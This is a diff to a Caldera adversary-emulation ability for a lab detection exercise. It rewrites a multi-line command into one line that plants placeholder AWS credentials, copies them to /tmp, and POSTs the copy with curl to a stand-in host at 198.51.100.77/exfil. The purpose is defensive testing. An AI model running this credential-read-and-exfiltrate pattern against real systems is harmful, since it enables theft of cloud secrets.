@@ -16,24 +16,13 @@
   platforms:
     linux:
       sh:
+        # Caldera 4.2.0 strips literal newlines (see linux_file_burst_encrypt
+        # for the full explanation). The original multi-line form with a
+        # heredoc collapsed into broken bash. Rewritten as a single line
+        # using `printf` instead of a heredoc and `;` between stages.
+        # Stage 1: stage fake AWS creds. Stage 2: read them (file event).
+        # Stage 3: exfil via curl (fails fast — that's fine).
         command: |
-          # Stage 1: write a fake AWS credentials file (lab-debian doesn't
-          # ship one by default — this is the same shape Phase 20's A5
-          # scenario uses).
-          mkdir -p /home/realuser/.aws
-          cat > /home/realuser/.aws/credentials <<'CREDS'
-          [default]
-          aws_access_key_id = AKIAEXAMPLEPHASE21
-          aws_secret_access_key = phase21SecretAccessKeyPlaceholderXXXXXXX
-          CREDS
-          chown -R realuser:realuser /home/realuser/.aws
-          # Stage 2: read it (the file event we want to surface).
-          cat /home/realuser/.aws/credentials > /tmp/.aws-stolen
-          # Stage 3: exfil via curl. Fails fast — that's fine.
-          curl -s --max-time 3 -X POST -d @/tmp/.aws-stolen http://198.51.100.77/exfil || true
-          # Stage 4: clean ssh login from realuser's session, no preceding
-          # failures. Caldera's own ssh ability will be the auth surface
-          # in the operation; this stage is just the cred-theft prelude.
+          mkdir -p /home/realuser/.aws ; printf '[default]\naws_access_key_id = AKIAEXAMPLEPHASE21\naws_secret_access_key = phase21SecretAccessKeyPlaceholderXXXXXXX\n' > /home/realuser/.aws/credentials ; chown -R realuser:realuser /home/realuser/.aws ; cat /home/realuser/.aws/credentials > /tmp/.aws-stolen ; curl -s --max-time 3 -X POST -d @/tmp/.aws-stolen http://198.51.100.77/exfil || true
         cleanup: |
-          rm -f /tmp/.aws-stolen
-          rm -rf /home/realuser/.aws
+          rm -f /tmp/.aws-stolen ; rm -rf /home/realuser/.aws
